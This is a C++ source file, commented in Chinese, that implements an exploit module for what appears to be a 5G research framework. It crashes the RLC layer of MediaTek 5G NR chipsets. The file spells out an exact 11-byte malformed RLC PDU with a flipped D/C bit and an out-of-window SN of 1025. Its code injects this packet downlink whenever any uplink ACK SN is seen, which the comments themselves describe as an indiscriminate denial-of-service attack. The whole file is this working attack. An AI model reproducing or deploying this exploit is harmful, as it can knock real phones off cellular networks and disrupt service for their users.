/**
 * @file mac_sch_mtk_rlc_crash.cc
 * @brief DoS 攻击模块 —— MediaTek 芯片 RLC 层崩溃 (畸形 ACK 注入)
 *
 * 攻击原理：
 *   向 UE 发送一个**畸形的 RLC PDU**，其中：
 *   - 将 PDU 类型从 Control (控制) 篡改为 Data (数据)
 *   - 设置非法的序列号 SN=1025 (超出 RLC AM 窗口范围)
 *   这会导致 MediaTek 芯片组的 RLC 层处理逻辑出现异常，触发崩溃。
 *
 * 触发条件：
 *   只要收到任何携带 ACK SN 字段的上行消息 (即 UE 正在活跃通信)，
 *   就立即注入畸形 ACK。这是一种**无差别 DoS 攻击**。
 *
 * 受影响设备：
 *   MediaTek (联发科) 芯片组的 5G NR 终端设备。
 */

#include "shadower/modules/exploit.h"

/**
 * 畸形 RLC PDU (11 字节)
 *
 * 正常的 RLC AM STATUS PDU (Control PDU):
 *   - D/C=1 (bit7=1 表示 Control), CPT=STATUS, ACK_SN, ...
 *
 * 本畸形 PDU 的篡改：
 *   - 将 D/C 位改为 0 (Data)，但内容仍按 STATUS PDU 格式填充
 *   - SN 设置为 1025，超出正常 RLC AM 窗口大小
 *   - 这种矛盾的 PDU 类型 + 非法 SN 组合会触发 MTK RLC 实现的 bug
 */
const uint8_t malformed_ack[] = {0x41,       // 篡改的 D/C + SN 高位
                                 0x00,       // SN 低位
                                 0x03,       // 分段信息
                                 0x84,       // ACK SN 高位 (= 1025 >> 8 的部分)
                                 0x01,       // ACK SN 低位
                                 0x00,       // payload
                                 0x3f,
                                 0x00,
                                 0x00,
                                 0x00,
                                 0x00};

class MacSchMTKRLCCrash : public Exploit
{
public:
  MacSchMTKRLCCrash(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                    SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    msg.reset(new std::vector<uint8_t>(malformed_ack, malformed_ack + sizeof(malformed_ack)));
  }

  void setup() override
  {
    // 监听 RLC AM ACK SN 字段 —— 只要 UE 发送了任何 RLC STATUS PDU 就触发攻击
    f_sn = wd_field("rlc-nr.am.ack-sn");
  }

  void pre_dissection(wd_t* wd) override { wd_register_field(wd, f_sn); }

  void post_dissection(wd_t*                 wd,
                       uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    if (direction == UL) {
      // 检测到上行 RLC STATUS PDU (包含 ACK SN) -> 立即注入畸形 ACK
      wd_field_info_t sn_info = wd_read_field(wd, f_sn);
      if (sn_info) {
        dl_buffer_queue.push(msg);
        logger.info("Received msg with SN sending malformed ACK");
      }
    }
  }

private:
  wd_field_t                             f_sn; ///< RLC AM ACK SN 字段
  std::shared_ptr<std::vector<uint8_t> > msg;  ///< 畸形 RLC PDU 载荷
};

/* 模块工厂函数 */
extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new MacSchMTKRLCCrash(dl_buffer_queue_, ul_buffer_queue_);
}
}
